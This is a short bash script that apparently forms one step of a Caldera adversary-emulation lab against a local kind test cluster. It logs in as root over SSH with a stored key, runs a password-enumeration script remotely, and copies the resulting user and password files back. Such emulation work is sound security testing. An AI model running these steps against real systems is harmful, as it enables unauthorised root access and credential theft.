
#!/usr/bin/env bash
set -eu pipefail

SSH_KEY="$DATA_PATH/KC6/ssh/ssh-key"
OUT_FILE="$DATA_PATH/KC6/logenum"

ssh -i "$SSH_KEY" -p 122 root@kind-cluster-control-plane '/usr/bin/env bash -s -- "/tmp"' < /opt/caldera/KC2/pass-enum.sh > $OUT_FILE
scp -i "$SSH_KEY" -P 122 root@kind-cluster-control-plane:/tmp/user /tmp/user
scp -i "$SSH_KEY" -P 122 root@kind-cluster-control-plane:/tmp/pass /tmp/pass